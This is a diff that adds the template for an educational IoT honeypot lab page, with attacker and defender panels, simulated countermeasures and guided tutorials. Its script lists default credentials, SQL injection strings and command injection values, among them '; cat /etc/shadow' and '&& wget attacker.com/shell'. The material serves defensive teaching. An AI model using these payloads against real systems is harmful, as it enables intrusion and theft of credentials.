@@ -1,0 +1,1648 @@
+{% extends "base.html" %}
+
+{% block title %}{{ attack_config.title }} | IoT Honeypot{% endblock %}
+
+{% block extra_head %}
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+    .font-mono { font-family: 'JetBrains Mono', monospace; }
+    
+    /* ===== SIDEBAR AUTO-HIDE FOR LAB MODE ===== */
+    body.lab-mode > aside {
+        transform: translateX(-100%);
+        position: fixed;
+        z-index: 100;
+        transition: transform 0.3s ease;
+        height: 100vh;
+        box-shadow: 4px 0 20px rgba(0,0,0,0.5);
+    }
+    
+    body.lab-mode > aside.sidebar-visible {
+        transform: translateX(0);
+    }
+    
+    body.lab-mode > main {
+        margin-left: 0 !important;
+        width: 100% !important;
+    }
+    
+    /* Sidebar toggle button */
+    .sidebar-toggle-btn {
+        position: fixed;
+        left: 8px;
+        top: 50%;
+        transform: translateY(-50%);
+        z-index: 90;
+        background: #1e293b;
+        border: 1px solid #475569;
+        color: #94a3b8;
+        padding: 10px 6px;
+        border-radius: 0 8px 8px 0;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    
+    .sidebar-toggle-btn:hover {
+        background: #334155;
+        color: white;
+        padding-left: 10px;
+    }
+    
+    body.lab-mode > aside.sidebar-visible ~ main .sidebar-toggle-btn {
+        left: 264px;
+    }
+    
+    /* ===== FIXED LAYOUT - NO OVERFLOW ISSUES ===== */
+    .lab-wrapper {
+        display: flex;
+        flex-direction: column;
+        height: 100vh;
+        overflow: hidden;
+    }
+    
+    .lab-header {
+        flex-shrink: 0;
+    }
+    
+    .lab-main {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        min-height: 0;
+        overflow: hidden;
+    }
+    
+    /* Split view */
+    .split-container {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        flex: 1;
+        min-height: 0;
+        overflow: hidden;
+    }
+    
+    /* Panel layout */
+    .panel {
+        display: flex;
+        flex-direction: column;
+        min-height: 0;
+        overflow: hidden;
+    }
+    
+    .panel-header {
+        flex-shrink: 0;
+    }
+    
+    .panel-body {
+        flex: 1;
+        overflow-y: auto;
+        min-height: 0;
+    }
+    
+    .panel-footer {
+        flex-shrink: 0;
+    }
+    
+    /* Attacker panel */
+    .attacker-panel {
+        background: linear-gradient(135deg, #1f1f1f 0%, #2d1f1f 100%);
+        border-right: 4px solid #dc2626;
+    }
+    
+    /* Defender panel */
+    .defender-panel {
+        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+        border-left: 4px solid #2563eb;
+    }
+    
+    /* ===== EDUCATION PANEL - COLLAPSIBLE ===== */
+    .education-panel {
+        flex-shrink: 0;
+        overflow: hidden;
+        transition: max-height 0.3s ease, padding 0.3s ease;
+    }
+    
+    .education-panel.collapsed {
+        max-height: 0 !important;
+        padding-top: 0 !important;
+        padding-bottom: 0 !important;
+        border: none !important;
+    }
+    
+    .education-panel.expanded {
+        max-height: 150px;
+    }
+    
+    /* ===== ANIMATIONS ===== */
+    .log-entry {
+        animation: slideIn 0.25s ease-out;
+    }
+    
+    @keyframes slideIn {
+        from { opacity: 0; transform: translateX(-10px); }
+        to { opacity: 1; transform: translateX(0); }
+    }
+    
+    .log-highlight {
+        background: rgba(34, 197, 94, 0.15);
+        border-left: 3px solid #22c55e;
+        padding-left: 8px;
+        margin-left: -8px;
+    }
+    
+    .log-alert {
+        background: rgba(239, 68, 68, 0.15);
+        border-left: 3px solid #ef4444;
+        padding-left: 8px;
+        margin-left: -8px;
+    }
+    
+    .challenge-active {
+        box-shadow: 0 0 0 3px rgba(251, 191, 36, 0.5);
+        animation: challengePulse 2s ease-in-out infinite;
+    }
+    
+    @keyframes challengePulse {
+        0%, 100% { box-shadow: 0 0 0 3px rgba(251, 191, 36, 0.3); }
+        50% { box-shadow: 0 0 0 6px rgba(251, 191, 36, 0.5); }
+    }
+    
+    .success-flash {
+        animation: successFlash 0.5s ease 2;
+    }
+    
+    @keyframes successFlash {
+        0%, 100% { background-color: white; }
+        50% { background-color: #d1fae5; }
+    }
+    
+    /* Scrollbar */
+    .custom-scrollbar::-webkit-scrollbar { width: 5px; }
+    .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); }
+    .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 3px; }
+    .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.3); }
+    
+    /* ===== COUNTERMEASURES ===== */
+    .defense-btn {
+        transition: all 0.15s ease;
+        position: relative;
+    }
+    .defense-btn:hover { transform: translateY(-1px); }
+    .defense-btn.active {
+        box-shadow: 0 0 0 2px rgba(34, 197, 94, 0.5);
+    }
+    .defense-btn .tooltip {
+        display: none;
+        position: absolute;
+        bottom: calc(100% + 6px);
+        left: 50%;
+        transform: translateX(-50%);
+        background: #1e293b;
+        border: 1px solid #475569;
+        padding: 6px 10px;
+        border-radius: 6px;
+        font-size: 10px;
+        white-space: nowrap;
+        z-index: 50;
+        color: #e2e8f0;
+        pointer-events: none;
+    }
+    .defense-btn:hover .tooltip { display: block; }
+    
+    /* Blocked overlay on attacker panel */
+    .blocked-overlay {
+        position: absolute;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.85);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 20;
+        animation: blockedFadeIn 0.3s ease;
+        border-radius: 8px;
+    }
+    @keyframes blockedFadeIn {
+        from { opacity: 0; }
+        to   { opacity: 1; }
+    }
+    
+    /* Reveal button fade in */
+    .reveal-btn {
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.3s;
+    }
+    .reveal-btn.visible {
+        opacity: 1;
+        pointer-events: auto;
+    }
+    
+    /* ===== OBJECTIVE - Clickable with hover underline ===== */
+    .objective-clickable {
+        cursor: pointer;
+        text-decoration: none;
+        border-bottom: 1.5px dashed transparent;
+        transition: border-color 0.2s, color 0.2s;
+        padding-bottom: 1px;
+    }
+    .objective-clickable:hover {
+        border-bottom-color: #fbbf24;
+        color: #fde68a;
+    }
+    .objective-clickable.active-task {
+        background: rgba(251, 191, 36, 0.15);
+        padding: 2px 8px;
+        border-radius: 4px;
+    }
+    
+    /* ===== OBJECTIVE DETAIL POPUP ===== */
+    .objective-popup {
+        display: none;
+        position: absolute;
+        top: 100%;
+        left: 50%;
+        transform: translateX(-50%);
+        margin-top: 6px;
+        background: #1e293b;
+        border: 1.5px solid #fbbf24;
+        border-radius: 8px;
+        padding: 12px 16px;
+        min-width: 280px;
+        z-index: 200;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+        animation: popupFadeIn 0.15s ease-out;
+    }
+    .objective-popup.visible { display: block; }
+    .objective-popup::before {
+        content: '';
+        position: absolute;
+        top: -6px;
+        left: 50%;
+        transform: translateX(-50%) rotate(45deg);
+        width: 10px;
+        height: 10px;
+        background: #1e293b;
+        border-left: 1.5px solid #fbbf24;
+        border-top: 1.5px solid #fbbf24;
+    }
+    @keyframes popupFadeIn {
+        from { opacity: 0; transform: translateX(-50%) translateY(-4px); }
+        to   { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+
+    /* ===== MISSION MODE HINT ANIMATIONS ===== */
+    @keyframes hint-pulse {
+        0%, 100% { box-shadow: 0 0 0 0 rgba(251, 191, 35, 0); }
+        50% { box-shadow: 0 0 12px 3px rgba(251, 191, 35, 0.25); }
+    }
+    @keyframes hint-glow {
+        0%, 100% { box-shadow: 0 0 4px rgba(251, 191, 35, 0.3); border-color: #f59e0b; }
+        50% { box-shadow: 0 0 14px 4px rgba(251, 191, 35, 0.5); border-color: #fbbf24; }
+    }
+    #quick-payloads.hint-nudge {
+        animation: hint-pulse 2s ease-in-out infinite;
+        border-radius: 8px;
+    }
+    #quick-payloads .hint-label {
+        display: none;
+        text-align: center;
+        font-size: 10px;
+        color: #fbbf24;
+        margin-bottom: 4px;
+        animation: popupFadeIn 0.3s ease;
+    }
+    #quick-payloads.hint-nudge .hint-label { display: block; }
+    .payload-btn[data-golden].hint-golden {
+        animation: hint-glow 1.5s ease-in-out infinite !important;
+        border: 1.5px solid #f59e0b !important;
+        background: rgba(245, 158, 11, 0.15) !important;
+        color: #fbbf24 !important;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<!-- Sidebar Toggle Button -->
+<button class="sidebar-toggle-btn" onclick="toggleSidebar()" title="Toggle Sidebar">
+    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/>
+    </svg>
+</button>
+
+<div class="lab-wrapper bg-gray-900 text-white">
+    
+    <!-- ===== HEADER BAR ===== -->
+    <header class="lab-header bg-gray-800 border-b border-gray-700 px-4 py-2">
+        <div class="flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <a href="/simulation" class="flex items-center gap-1 text-gray-400 hover:text-white transition-colors text-sm">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+                    </svg>
+                    Back
+                </a>
+                <div class="h-5 w-px bg-gray-600"></div>
+                <span class="text-xl">{{ attack_config.icon }}</span>
+                <h1 class="text-sm font-bold">{{ attack_config.title }}</h1>
+                <span class="px-2 py-0.5 bg-{{ attack_config.color }}-500/20 text-{{ attack_config.color }}-400 text-xs font-bold rounded">
+                    {{ attack_config.mitre_id }}
+                </span>
+            </div>
+            
+            <div class="flex items-center gap-2">
+                <!-- Mode Toggle -->
+                <div class="flex items-center gap-0.5 bg-gray-700 rounded p-0.5">
+                    <button id="btn-guided" onclick="setMode('guided')" class="px-3 py-1 rounded text-xs font-semibold transition-all bg-amber-500 text-black">
+                        📚 Guided
+                    </button>
+                    <button id="btn-sandbox" onclick="setMode('sandbox')" class="px-3 py-1 rounded text-xs font-semibold transition-all text-gray-400 hover:text-white">
+                        🎮 Sandbox
+                    </button>
+                </div>
+                
+                <!-- Education Toggle -->
+                <button onclick="toggleEducation()" class="px-2 py-1 bg-gray-700 hover:bg-gray-600 rounded text-xs text-gray-300">
+                    📖 <span id="edu-toggle-text">Hide Info</span>
+                </button>
+                
+                <!-- Reset -->
+                <button onclick="resetLab()" class="px-2 py-1 bg-gray-700 hover:bg-gray-600 rounded text-xs text-white">
+                    🔄 Reset
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== MISSION PHASE BAR (shown only in mission mode) ===== -->
+    <div id="mission-phase-bar" class="lab-header bg-gray-800/80 border-b border-amber-500/30 px-4 py-1.5" style="display:none;">
+        <div class="flex items-center justify-between">
+            <div class="flex items-center gap-1">
+                <div style="width:8px;height:8px;border-radius:50%;background:#22c55e;"></div>
+                <span class="text-[10px] text-green-400 mx-1">Recon</span>
+                <div style="width:24px;height:2px;background:#22c55e;"></div>
+                <div style="width:8px;height:8px;border-radius:50%;background:#22c55e;"></div>
+                <span class="text-[10px] text-green-400 mx-1">Weapon</span>
+                <div style="width:24px;height:2px;background:#22c55e;"></div>
+                <div style="width:8px;height:8px;border-radius:50%;background:#f59e0b;box-shadow:0 0 6px #f59e0b;"></div>
+                <span class="text-[10px] font-bold text-amber-400 mx-1">Exploit</span>
+                <div style="width:24px;height:2px;background:#475569;"></div>
+                <div style="width:8px;height:8px;border-radius:50%;background:#475569;"></div>
+                <span class="text-[10px] text-gray-500 mx-1">Success</span>
+            </div>
+            <span class="text-[9px] text-amber-400 font-mono" id="mission-timer"></span>
+        </div>
+    </div>
+
+    <!-- ===== TUTORIAL BAR (Guided Mode) ===== -->
+    <div id="tutorial-bar" class="lab-header bg-amber-500/10 border-b border-amber-500/30 px-4 py-1.5 relative">
+        <div class="flex items-center justify-between gap-4">
+            <div class="flex items-center gap-2">
+                <span class="text-amber-400 font-semibold text-xs">Tutorial:</span>
+                <div class="w-20 bg-gray-700 rounded-full h-1.5">
+                    <div id="tutorial-progress" class="bg-amber-500 h-1.5 rounded-full transition-all" style="width: 0%"></div>
+                </div>
+                <span id="tutorial-step" class="text-[10px] text-gray-400">0/5</span>
+            </div>
+            
+            <div class="flex-1 text-center relative">
+                <span class="font-semibold text-xs text-amber-200">Objective: </span>
+                <span id="objective-text" class="objective-clickable text-sm font-bold text-amber-300" onclick="toggleObjectivePopup()" title="Click for details">Click "Start Tutorial"</span>
+                
+                <!-- Detail Popup -->
+                <div id="objective-popup" class="objective-popup">
+                    <div class="text-[10px] font-bold text-amber-400 uppercase mb-2 tracking-wider">📋 Task Details</div>
+                    <div class="space-y-2">
+                        <div class="flex items-center gap-2">
+                            <span class="text-[10px] text-gray-400 w-16 shrink-0">Username:</span>
+                            <code id="popup-username" class="text-xs font-mono bg-gray-800 text-green-400 px-2 py-0.5 rounded flex-1">—</code>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <span class="text-[10px] text-gray-400 w-16 shrink-0">Password:</span>
+                            <code id="popup-password" class="text-xs font-mono bg-gray-800 text-green-400 px-2 py-0.5 rounded flex-1">—</code>
+                        </div>
+                        <div class="pt-1 border-t border-gray-700">
+                            <span class="text-[10px] text-gray-400">💡 Hint: </span>
+                            <span id="popup-hint" class="text-[10px] text-amber-200">—</span>
+                        </div>
+                    </div>
+                    <div class="mt-2 text-[9px] text-gray-500 text-center">Click anywhere to close</div>
+                </div>
+            </div>
+            
+            <button id="btn-reveal" onclick="revealAnswer()" class="reveal-btn px-2 py-1 bg-amber-600/50 hover:bg-amber-600 text-amber-200 text-xs rounded">
+                💡 Show Answer
+            </button>
+        </div>
+    </div>
+
+    <!-- ===== MAIN CONTENT ===== -->
+    <div class="lab-main">
+        <div class="split-container">
+            
+            <!-- LEFT: ATTACKER PANEL -->
+            <div class="panel attacker-panel">
+                <div class="panel-header bg-red-900/50 px-4 py-2 border-b border-red-800/50">
+                    <div class="flex items-center gap-2 mb-2">
+                        <span class="text-lg">👤</span>
+                        <div>
+                            <h2 class="font-bold text-red-400 text-sm">ATTACKER VIEW</h2>
+                            <p class="text-[10px] text-red-300/60">Simulating malicious actor</p>
+                        </div>
+                    </div>
+                    
+                    <!-- IP Selector Section -->
+                    <div class="space-y-2">
+                        <!-- Dropdown for known IPs -->
+                        <div>
+                            <label class="text-[10px] text-gray-400 mb-0.5 block">Attacker IP (Real AbuseIPDB Lookup)</label>
+                            <div class="flex gap-1">
+                                <select id="attacker-ip-select" onchange="onIpSelected()" 
+                                        class="flex-1 bg-gray-800 text-green-400 font-mono text-xs rounded px-2 py-1.5 border border-gray-700 focus:border-green-500 focus:outline-none">
+                                    <option value="">Loading...</option>
+                                </select>
+                                <button onclick="checkSelectedIp()" title="Check reputation" 
+                                        class="px-2 py-1 bg-gray-700 hover:bg-gray-600 rounded text-xs">
+                                    🔍
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- Custom IP input -->
+                        <div>
+                            <label class="text-[10px] text-gray-400 mb-0.5 block">Or enter any public IP</label>
+                            <div class="flex gap-1">
+                                <input type="text" id="custom-ip-input" placeholder="e.g., 45.155.205.233"
+                                       class="flex-1 bg-gray-800 text-green-400 font-mono text-xs rounded px-2 py-1.5 border border-gray-700 focus:border-green-500 focus:outline-none">
+                                <button onclick="useCustomIp()" title="Use this IP"
+                                        class="px-2 py-1 bg-green-700 hover:bg-green-600 rounded text-xs">
+                                    ✓
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- IP Reputation Preview -->
+                        <div id="ip-reputation-preview" class="hidden p-2 bg-gray-800/80 rounded border border-gray-700 text-[10px]">
+                            <div class="grid grid-cols-3 gap-2">
+                                <div>
+                                    <span class="text-gray-500">Score:</span>
+                                    <span id="preview-score" class="font-bold ml-1">--</span>
+                                </div>
+                                <div>
+                                    <span class="text-gray-500">Country:</span>
+                                    <span id="preview-country" class="font-mono ml-1">--</span>
+                                </div>
+                                <div>
+                                    <span class="text-gray-500">Source:</span>
+                                    <span id="preview-source" class="ml-1">--</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="panel-body custom-scrollbar p-4 flex flex-col items-center">
+                    <div class="w-full max-w-xs">
+                        <!-- IoT Device Login -->
+                        <div id="login-container" class="bg-white rounded-lg shadow-xl overflow-hidden relative">
+                            
+                            <!-- Blocked/Rate-Limited/Locked Overlay (hidden by default) -->
+                            <div id="blocked-overlay" class="blocked-overlay" style="display:none;">
+                                <div id="blocked-icon" class="text-5xl mb-3">🚫</div>
+                                <div id="blocked-title" class="text-xl font-black text-red-500 mb-1">403 FORBIDDEN</div>
+                                <div id="blocked-detail" class="text-xs text-gray-400 text-center px-6 mb-3">Access denied by firewall rule.</div>
+                                <div id="blocked-mitre" class="text-[10px] text-purple-400 font-mono"></div>
+                            </div>
+                            
+                            <div class="bg-gradient-to-r from-blue-900 to-blue-800 px-4 py-3">
+                                <div class="flex items-center gap-2">
+                                    <div class="w-8 h-8 bg-white/10 rounded flex items-center justify-center">
+                                        <span class="text-base">📡</span>
+                                    </div>
+                                    <div>
+                                        <h3 class="font-bold text-white text-sm">{{ persona_name }}</h3>
+                                        <p class="text-[10px] text-blue-200">Admin Portal</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="p-4">
+                                <div id="login-error" class="hidden mb-3 p-2 bg-red-50 border border-red-200 rounded text-red-700 text-xs">
+                                    <span class="font-semibold">Failed:</span> <span id="error-message">Invalid credentials</span>
+                                </div>
+                                
+                                <form id="attack-form" onsubmit="submitAttack(event)">
+                                    <div class="mb-3">
+                                        <label class="block text-xs font-semibold text-gray-700 mb-1">Username</label>
+                                        <input type="text" id="input-username" 
+                                            class="w-full px-3 py-2 border-2 border-gray-200 rounded focus:border-blue-500 focus:outline-none text-gray-900 text-sm"
+                                            placeholder="Enter username" autocomplete="off">
+                                        <div id="username-hint" class="hidden mt-1 p-1.5 bg-amber-50 border border-amber-200 rounded text-[10px] text-amber-800"></div>
+                                    </div>
+                                    
+                                    <div class="mb-4">
+                                        <label class="block text-xs font-semibold text-gray-700 mb-1">Password</label>
+                                        <input type="text" id="input-password" 
+                                            class="w-full px-3 py-2 border-2 border-gray-200 rounded focus:border-blue-500 focus:outline-none text-gray-900 text-sm"
+                                            placeholder="Enter password" autocomplete="off">
+                                    </div>
+                                    
+                                    <button type="submit" class="w-full bg-blue-900 hover:bg-blue-800 text-white font-bold py-2 rounded text-sm transition-colors">
+                                        Sign In
+                                    </button>
+                                </form>
+                                
+                                <p class="mt-3 text-center text-[10px] text-gray-400">
+                                    Firmware v1.4.2 | {{ vendor }}
+                                </p>
+                            </div>
+                        </div>
+                        
+                        <!-- Quick Payloads (Sandbox) -->
+                        <div id="quick-payloads" class="hidden mt-3">
+                            <div class="hint-label">💡 Try one of these payloads</div>
+                            <p class="text-[10px] text-gray-400 mb-1 text-center">Quick Payloads:</p>
+                            <div class="grid grid-cols-2 gap-1" id="payload-buttons"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- RIGHT: DEFENDER PANEL -->
+            <div class="panel defender-panel">
+                <div class="panel-header bg-blue-900/50 px-4 py-2 border-b border-blue-800/50">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <span class="text-lg">🛡️</span>
+                            <div>
+                                <h2 class="font-bold text-blue-400 text-sm">DEFENDER VIEW</h2>
+                                <p class="text-[10px] text-blue-300/60">Honeypot console</p>
+                            </div>
+                        </div>
+                        <div class="flex items-center gap-1">
+                            <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                            <span class="text-[10px] text-green-400 font-mono">CAPTURING</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Stats -->
+                <div class="panel-header grid grid-cols-5 gap-1 p-2 bg-gray-800/50 border-b border-gray-700">
+                    <div class="text-center">
+                        <div id="stat-total" class="text-base font-bold text-white">0</div>
+                        <div class="text-[9px] text-gray-400">Total</div>
+                    </div>
+                    <div class="text-center">
+                        <div id="stat-bruteforce" class="text-base font-bold text-orange-400">0</div>
+                        <div class="text-[9px] text-gray-400">Brute Force</div>
+                    </div>
+                    <div class="text-center">
+                        <div id="stat-sqli" class="text-base font-bold text-red-400">0</div>
+                        <div class="text-[9px] text-gray-400">SQLi</div>
+                    </div>
+                    <div class="text-center">
+                        <div id="stat-cmdi" class="text-base font-bold text-purple-400">0</div>
+                        <div class="text-[9px] text-gray-400">CmdI</div>
+                    </div>
+                    <div class="text-center">
+                        <div id="stat-threat" class="text-base font-bold text-green-400">LOW</div>
+                        <div class="text-[9px] text-gray-400">Threat</div>
+                    </div>
+                </div>
+                
+                <!-- Countermeasures Toolbar -->
+                <div class="panel-header bg-gray-800/80 border-b border-gray-700 px-3 py-2">
+                    <div class="flex items-center justify-between mb-1.5">
+                        <div class="flex items-center gap-1.5">
+                            <span class="text-xs">⚔️</span>
+                            <span class="text-[9px] font-bold text-gray-300 uppercase tracking-wider">Countermeasures</span>
+                        </div>
+                        <button onclick="resetDefenses()" class="text-[9px] text-gray-500 hover:text-white transition-colors">Reset All</button>
+                    </div>
+                    <div class="flex gap-1.5">
+                        <!-- Block IP -->
+                        <button id="def-block-ip" onclick="toggleBlockIp()" class="defense-btn flex-1 px-2 py-1.5 bg-gray-700 hover:bg-red-900/50 border border-gray-600 rounded text-[10px] font-semibold text-gray-300 text-center">
+                            🚫 Block IP
+                            <div class="tooltip">
+                                <div class="font-bold text-red-400 mb-0.5">Firewall Rule</div>
+                                Block current attacker IP. Returns 403 Forbidden.<br>
+                                <span class="text-purple-400">MITRE M1035</span> - Limit Access to Resource
+                            </div>
+                        </button>
+                        <!-- Rate Limit -->
+                        <button id="def-rate-limit" onclick="toggleRateLimit()" class="defense-btn flex-1 px-2 py-1.5 bg-gray-700 hover:bg-orange-900/50 border border-gray-600 rounded text-[10px] font-semibold text-gray-300 text-center">
+                            ⏱️ Rate Limit
+                            <div class="tooltip">
+                                <div class="font-bold text-orange-400 mb-0.5">Request Throttling</div>
+                                Limit to 5 requests per IP. Returns 429 after.<br>
+                                <span class="text-purple-400">MITRE M1036</span> - Account Use Policies
+                            </div>
+                        </button>
+                        <!-- Account Lockout -->
+                        <button id="def-lockout" onclick="toggleLockout()" class="defense-btn flex-1 px-2 py-1.5 bg-gray-700 hover:bg-yellow-900/50 border border-gray-600 rounded text-[10px] font-semibold text-gray-300 text-center">
+                            🔒 Lockout
+                            <div class="tooltip">
+                                <div class="font-bold text-yellow-400 mb-0.5">Account Lockout Policy</div>
+                                Lock accounts after 3 failed login attempts.<br>
+                                <span class="text-purple-400">MITRE M1032</span> - Multi-factor Authentication
+                            </div>
+                        </button>
+                        <!-- WAF Signature Filter -->
+                        <button id="def-waf" onclick="toggleWaf()" class="defense-btn flex-1 px-2 py-1.5 bg-gray-700 hover:bg-green-900/50 border border-gray-600 rounded text-[10px] font-semibold text-gray-300 text-center">
+                            🛡️ WAF
+                            <div class="tooltip">
+                                <div class="font-bold text-green-400 mb-0.5">Web Application Firewall</div>
+                                Inspects payloads for SQLi &amp; CmdI signatures.<br>
+                                Blocks malicious input, allows normal credentials.<br>
+                                <span class="text-purple-400">MITRE M1050</span> - Exploit Protection
+                            </div>
+                        </button>
+                    </div>
+                    <!-- Active defenses indicator -->
+                    <div id="active-defenses-bar" class="hidden mt-1.5 flex flex-wrap gap-1">
+                    </div>
+                </div>
+                
+                <!-- Log Terminal -->
+                <div class="panel-body custom-scrollbar">
+                    <div class="px-3 py-1 bg-gray-800 border-b border-gray-700 flex justify-between items-center sticky top-0">
+                        <span class="text-[10px] text-gray-400 font-mono">honeypot.log</span>
+                        <button onclick="clearLogs()" class="text-[10px] text-gray-500 hover:text-white">Clear</button>
+                    </div>
+                    <div id="log-container" class="p-3 font-mono text-[10px] space-y-0.5">
+                        <div class="text-gray-500">[SYS] Honeypot on port 80</div>
+                        <div class="text-gray-500">[SYS] Persona: {{ persona_name }}</div>
+                        <div class="text-gray-500">[SYS] MITRE ATT&CK loaded</div>
+                        <div class="text-green-400">[READY] Waiting...</div>
+                    </div>
+                </div>
+                
+                <!-- MITRE Panel -->
+                <div class="panel-footer p-3 bg-gray-800/50 border-t border-gray-700">
+                    <h4 class="text-[9px] font-bold text-gray-400 uppercase mb-1">Classification</h4>
+                    <div id="mitre-content" class="text-gray-500 text-xs">
+                        Submit credentials to see results.
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- ===== EDUCATION PANEL (Collapsible) ===== -->
+        <div id="education-panel" class="education-panel expanded bg-gray-800 border-t border-gray-700 px-4 py-3">
+            <div class="flex items-start gap-4">
+                <div class="flex-1 min-w-0">
+                    <div class="flex items-center gap-1 mb-1">
+                        <span>📖</span>
+                        <h3 class="font-bold text-white text-sm">What's Happening?</h3>
+                    </div>
+                    <p id="explanation-text" class="text-xs text-gray-300 leading-relaxed">
+                        {{ attack_config.description }}. Act as attacker on <span class="text-red-400">left</span>, see honeypot response on <span class="text-blue-400">right</span>.
+                    </p>
+                </div>
+                
+                <div class="w-56 p-2 bg-green-900/30 border border-green-700/50 rounded flex-shrink-0">
+                    <div class="flex items-center gap-1 mb-0.5">
+                        <span class="text-sm">🛡️</span>
+                        <span class="text-[9px] font-bold text-green-400 uppercase">Defense Tip</span>
+                    </div>
+                    <p id="defense-tip" class="text-[10px] text-green-200">
+                        Change default credentials immediately after setup.
+                    </p>
+                </div>
+                
+                <div class="flex-shrink-0">
+                    <button id="btn-tutorial-action" onclick="tutorialAction()" class="px-4 py-2 bg-amber-500 hover:bg-amber-400 text-black font-bold rounded text-xs transition-colors">
+                        ▶ Start Tutorial
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ============================================================================
+    // CONFIG & STATE
+    // ============================================================================
+    const attackType = '{{ attack_type }}';
+    const quickPayloads = {
+        brute_force: [
+            { label: 'admin/admin', user: 'admin', pass: 'admin' },
+            { label: 'admin/admin123', user: 'admin', pass: 'admin123', golden: true },
+            { label: 'root/root', user: 'root', pass: 'root' },
+            { label: 'ubnt/ubnt', user: 'ubnt', pass: 'ubnt' },
+        ],
+        sqli: [
+            { label: "' OR '1'='1", user: "' OR '1'='1", pass: '', golden: true },
+            { label: "admin'--", user: "admin'--", pass: '' },
+            { label: "' OR 1=1 --", user: "' OR 1=1 --", pass: '' },
+            { label: "' UNION SELECT", user: "' UNION SELECT NULL--", pass: '' },
+        ],
+        cmdi: [
+            { label: '; ls -la', user: 'admin', pass: '; ls -la' },
+            { label: '; cat /etc/shadow', user: 'admin', pass: '; cat /etc/shadow', golden: true },
+            { label: '$(whoami)', user: '$(whoami)', pass: '' },
+            { label: '&& wget evil/shell', user: 'admin', pass: '&& wget attacker.com/shell' },
+        ]
+    };
+    
+    let mode = 'guided';
+    let tutorialStep = 0;
+    let tutorialData = [];
+    let stats = { total: 0, brute_force: 0, sqli: 0, cmdi: 0 };
+    
+    // Mission mode detection (only true when coming from weapon phase via ?mission=true)
+    const isMissionMode = new URLSearchParams(window.location.search).get('mission') === 'true';
+    let missionAttempts = 0;
+    let missionBlocked = 0;
+    let sidebarVisible = false;
+    let educationVisible = true;
+    let revealTimer = null;
+    
+    // Defense state
+    let defenses = {
+        blocked_ips: new Set(),
+        rate_limit: false,
+        account_lockout: false,
+        waf: false,
+        blocked_count: 0
+    };
+    
+    // IP Selector state
+    let selectedAttackerIp = '';
+    let attackSources = [];
+
+    // ============================================================================
+    // INIT
+    // ============================================================================
+    document.addEventListener('DOMContentLoaded', async () => {
+        document.body.classList.add('lab-mode');
+        
+        // Reset all defenses on page load so UI and server are always in sync
+        fetch('/api/lab/defend', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'reset_all' })
+        }).catch(() => {});
+        
+        // Load tutorial data
+        try {
+            const res = await fetch(`/api/lab/tutorial?type=${attackType}`);
+            tutorialData = await res.json();
+        } catch (e) {
+            tutorialData = getDefaultTutorial();
+        }
+        
+        initPayloads();
+        updateTutorialUI();
+        
+        // Load attack sources for IP selector
+        loadAttackSources();
+        
+        // Initialize mission mode UI
+        if (isMissionMode) {
+            document.getElementById('mission-phase-bar').style.display = '';
+            const missionStart = parseInt(sessionStorage.getItem('mission_start') || Date.now().toString());
+            setInterval(() => {
+                const s = Math.floor((Date.now() - missionStart) / 1000);
+                const el = document.getElementById('mission-timer');
+                if (el) el.textContent = String(Math.floor(s/60)).padStart(2,'0') + ':' + String(s%60).padStart(2,'0');
+            }, 1000);
+            // Auto-start in sandbox mode for mission (no tutorial needed)
+            setMode('sandbox');
+        }
+    });
+    
+    function getDefaultTutorial() {
+        if (attackType === 'sqli') {
+            return [
+                { step: 1, objective: "Enter ' OR '1'='1 in username", hint: "Creates always-true condition", expected_user: "' OR '1'='1", expected_pass: "" },
+                { step: 2, objective: "Enter admin'-- in username", hint: "Comments out password check", expected_user: "admin'--", expected_pass: "" },
+                { step: 3, objective: "🎉 Complete! Try Sandbox", final: true }
+            ];
+        }
+        if (attackType === 'cmdi') {
+            return [
+                { step: 1, objective: "Enter ; ls -la in password", hint: "Semicolon chains a second command", expected_user: "admin", expected_pass: "; ls -la" },
+                { step: 2, objective: "Enter | cat /etc/passwd in password", hint: "Pipe sends output to attacker", expected_user: "admin", expected_pass: "| cat /etc/passwd" },
+                { step: 3, objective: "Enter $(whoami) in username", hint: "Command substitution runs inside $()", expected_user: "$(whoami)", expected_pass: "" },
+                { step: 4, objective: "🎉 Complete! Try Sandbox", final: true }
+            ];
+        }
+        return [
+            { step: 1, objective: "Enter admin / admin", hint: "Most common default", expected_user: "admin", expected_pass: "admin" },
